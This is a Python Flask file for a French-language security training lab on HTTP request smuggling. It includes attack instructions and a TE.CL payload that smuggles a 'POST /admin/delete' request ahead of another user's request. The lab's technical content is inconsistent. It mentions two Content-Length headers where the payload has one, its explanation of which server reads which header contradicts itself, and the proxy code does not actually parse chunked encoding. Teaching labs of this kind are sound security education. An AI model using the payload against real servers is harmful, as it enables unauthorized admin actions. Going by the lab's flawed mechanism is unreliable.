from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)
BACKEND_URL = 'http://hrs_backend/'

HTML_TEMPLATE = """
<style>
    body { font-family: Arial; background-color: #f4f4f9; color: #333; margin: 20px; }
    h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
    .vulnerability-note { background-color: #e74c3c; color: white; padding: 10px; border-radius: 4px; text-align: center; margin-bottom: 15px; }
    .info { background: #ecf0f1; border: 1px solid #bdc3c7; padding: 15px; border-radius: 4px; white-space: pre-wrap; }
    .frontend-note { background-color: #5d5d5d; color: white; padding: 8px; border-radius: 4px; }
</style>

<div class="vulnerability-note">VULNÉRABILITÉ: HTTP Request Smuggling (HRS) - Port 8095</div>
<div class="frontend-note">FRONT-END SERVER (Lis Transfer-Encoding: chunked)</div>
<h1>Lab 16 - Front-end: Proxy Inversé</h1>

<p>Le Front-end (Proxy) transmet la requête au Back-end. L'attaque consiste à envoyer une requête où Front-end (TE) et Back-end (CL) ne s'accordent pas sur la fin de la première requête.</p>

<h2>Résultat du Back-end</h2>
<div class="info">
    {{ backend_response }}
</div>

<h3>Instructions pour l'Attaque (TE.CL)</h3>
<p><strong>Cible :</strong> Faire croire au Front-end que la requête est courte (via TE: 0) mais qu'elle est longue pour le Back-end (via CL).</p>
<p>1. Utilisez un outil comme Burp Suite ou <code>netcat</code>.</p>
<p>2. Envoyez cette requête (avec deux CL et le corps encodé en chunked):</p>
<pre>POST / HTTP/1.1
Host: localhost:8095
User-Agent: Attacker-Smuggler
Transfer-Encoding: chunked
Content-Length: 4

0
\r\n
POST /admin/delete HTTP/1.1\r\n
Host: localhost:8095\r\n
Content-Length: 18\r\n
\r\n
SMUGGLED-REQUEST-MAGIC\r\n
0\r\n
\r\n
</pre>
<p><strong>Explication :</strong></p>
<ul>
    <li>Le Front-end (lisant `TE: chunked`) voit le `0\r\n\r\n` et pense que la première requête est finie. Il transmet tout le reste au Back-end, le Back-end le met en tampon.</li>
    <li>Le Back-end (lisant `CL: 4`) pense que le corps de la première requête est `0\r\n` et laisse la requête `POST /admin/delete...` comme la **prochaine requête** dans le tampon.</li>
    <li>La prochaine requête légitime d'un autre utilisateur se retrouve avec le `POST /admin/delete` préfixé, l'attaquant accède donc à la page d'administration.</li>
</ul>
"""

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def frontend_proxy(path):
    
    # ⚠️ VULNÉRABILITÉ : Le Front-end lit Transfer-Encoding: chunked
    
    # Transférer tous les en-têtes (sauf ceux liés au transfert)
    headers = {k: v for k, v in request.headers.items() if k.lower() not in ['host', 'connection', 'transfer-encoding']}
    
    try:
        # Transférer la requête au Back-end
        response = requests.request(
            method=request.method,
            url=BACKEND_URL + path,
            headers=headers,
            data=request.get_data(),
            timeout=5
        )
        backend_response = response.text
    except requests.exceptions.RequestException as e:
        backend_response = f"Erreur de communication avec le Back-end : {e}"

    return render_template_string(HTML_TEMPLATE, backend_response=backend_response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
